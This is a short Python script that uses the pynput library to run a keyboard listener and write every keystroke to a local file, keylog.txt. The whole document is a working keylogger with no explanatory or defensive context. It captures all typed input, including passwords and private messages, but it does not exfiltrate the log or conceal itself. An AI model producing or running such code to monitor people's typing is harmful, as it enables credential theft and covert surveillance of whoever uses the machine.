from pynput import keyboard

# Define the log file
log_file = "keylog.txt"

def on_press(key):
    try:
        # Get the key as a string
        key_str = key.char if hasattr(key, 'char') and key.char is not None else str(key)
    except AttributeError:
        key_str = str(key)
    
    # Log the key to the file
    with open(log_file, "a") as f:
        f.write(key_str + "\n")

# Start listening for keypresses
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
